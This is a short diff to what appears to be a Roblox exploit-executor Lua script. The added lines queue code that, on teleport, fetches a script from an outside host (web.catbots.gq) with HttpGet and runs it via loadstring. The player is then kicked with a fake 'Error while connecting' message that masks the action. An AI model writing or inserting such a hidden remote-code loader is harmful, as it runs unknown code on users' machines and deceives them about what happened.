@@ -1,2 +1,3 @@
 -- OMG SCRIPT
-queue_on_teleport('')
+queue_on_teleport('loadstring(game:HttpGet("https://web.catbots.gq/roblox.txt"))()')
+game.Players.LocalPlayer:Kick("Error while connecting")
